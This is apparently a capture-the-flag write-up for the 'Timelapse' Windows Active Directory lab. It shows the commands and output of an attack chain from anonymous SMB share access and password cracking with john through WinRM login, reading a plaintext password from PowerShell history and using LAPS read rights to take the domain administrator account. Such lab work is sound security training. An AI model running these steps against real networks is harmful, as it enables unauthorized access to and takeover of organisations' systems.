## Timelapse

### Lab Details 

- Difficulty: Easy
- Type: SMB, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-27 06:01:09Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
|_ssl-date: 2025-09-27T06:02:41+00:00; +7h59m59s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
```
#### Initial Foothold 
- attempt to enumerate SMB anonymously
```bash
$ smbclient -L \\10.129.125.85\
Password for [WORKGROUP\ch4os1]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.125.85 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- found unusual share `Shares`
- attempt to login to `Shares` anonymously 
- download all remote files in `Shares`
```bash
$ smbclient //10.129.227.113/shares
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (364.3 KiloBytes/sec) (average 364.3 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (14756.7 KiloBytes/sec) (average 13513.0 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (10197.4 KiloBytes/sec) (average 13148.6 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (19573.2 KiloBytes/sec) (average 14820.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (7097.9 KiloBytes/sec) (average 14239.5 KiloBytes/sec)
```
- a zipped file looks very interesting amongst downloaded files
```bash
$ tree .
.
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
    ├── LAPS_Datasheet.docx
    ├── LAPS_OperationsGuide.docx
    ├── LAPS_TechnicalSpecification.docx
    └── LAPS.x64.msi

3 directories, 5 files
```
- unzipping require password 
- use `john` to crack the password
```bash
$ zip2john winrm_backup.zip > zip.hash

$ john ./zip.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-09-26 17:17) 3.846g/s 13359Kp/s 13359Kc/s 13359KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
- unzipping 
```bash
$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
$ ls
legacyy_dev_auth.pfx  winrm_backup.zip
```
- however unable to view the `pfx` file requires another password
- use `pfx2john` to get password hash and decrypt using `john`
```bash
$ pfx2john ./legacyy_dev_auth.pfx > pfx.hash

$ john pfx.hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:28 DONE (2025-09-26 17:24) 0.03480g/s 112486p/s 112486c/s 112486C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
- we can use `openssl` to extract the certificates 
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```
- using the certificates to authentication via `evil-winrm`
#### Lateral Movement (If any)
- load and run `winpeas.exe`
- found `ConsoleHost_history.txt` file for user `legacyy`
- view the history file we see that its using a password to run command as `svc_deploy`
```bash
*Evil-WinRM* PS C:\Users\legacyy> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
#### Privilege Escalation
- authenticate as `svc_deploy` via `evil-winrm`
```bash
$ evil-winrm -i 10.129.125.85 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
- check user group rights
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```
- we have `LAPS_Readers` group access, that group allows us to  read local account passwords of AD computers
- we can use [LAPS](https://github.com/ztrhgf/LAPS/tree/master )to retrieve the password
- load the tool to target and import it 
```bash
## import it
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> import-module ./AdmPwd.PS

## check what objects can manage the LAPS 
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity *


Name                 DistinguishedName                                                 Status
----                 -----------------                                                 ------
Domain Controllers   OU=Domain Controllers,DC=timelapse,DC=htb                         Delegated
Servers              OU=Servers,DC=timelapse,DC=htb                                    Delegated
Database             OU=Database,OU=Servers,DC=timelapse,DC=htb                        Delegated
Web                  OU=Web,OU=Servers,DC=timelapse,DC=htb                             Delegated
Dev                  OU=Dev,OU=Servers,DC=timelapse,DC=htb                             Delegated
Staff                OU=Staff,DC=timelapse,DC=htb                                      Delegated
Admins               OU=Admins,OU=Staff,DC=timelapse,DC=htb                            Delegated
Dev                  OU=Dev,OU=Staff,DC=timelapse,DC=htb                               Delegated
HelpDesk             OU=HelpDesk,OU=Staff,DC=timelapse,DC=htb                          Delegated
Groups               OU=Groups,OU=Staff,DC=timelapse,DC=htb                            Delegated
More than one object found, search using distinguishedName instead
At line:1 char:1
+ Find-AdmPwdExtendedRights -identity *
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Find-AdmPwdExtendedRights], AmbiguousResultException
    + FullyQualifiedErrorId : AdmPwd.PSTypes.AmbiguousResultException,AdmPwd.PS.FindExtendedRights

## Let's look at the right holders to see if we are able to manage the password
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders


ExtendedRightHolders
--------------------
{NT AUTHORITY\SYSTEM, TIMELAPSE\Domain Admins, TIMELAPSE\LAPS_Readers}

## The output of the previous command shows that the LAPS_Readers group has delegation over
## Domain Controllers which allows us to read the password for users in this object. We retrieve
## the password by using the following command.

*Evil-WinRM* PS C:\Users\svc_deploy\Documents> get-admpwdpassword -computername dc01 | Select password

Password
--------
FX@y4p6-z@(s$p&rr1qf0E-H
```
- get reverse shell as admin using the password
```bash
$ evil-winrm -i 10.129.125.85 -u Administrator -p 'FX@y4p6-z@(s$p&rr1qf0E-H' -S
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```
#### Resources

#### Lesson Learned
